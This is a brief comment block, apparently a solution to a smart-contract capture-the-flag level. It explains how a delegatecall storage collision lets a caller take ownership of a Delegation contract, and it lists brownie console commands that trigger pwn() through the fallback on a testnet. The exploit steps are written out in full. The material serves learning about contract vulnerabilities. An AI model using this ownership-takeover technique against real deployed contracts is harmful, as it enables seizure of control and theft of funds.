/* 

In this challenge we notice that owner state variables of both Delegate and Delegation contracts
are at stroage address 0 , a delegatecall to pwn() of Delegate from Delegation contract 
will update the owner state variable (state variable at address 0) of Delegation contract

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# call pwn() function via fallback function of Delegation contract

 accounts[0].transfer(to="DelegationContractAddress",data=web3.keccak(text='pwn()')[0:4])


# confirm owner at Storage Address 0

web3.eth.getStorageAt("DelegationContractAddress",0)

# submit instance 


 */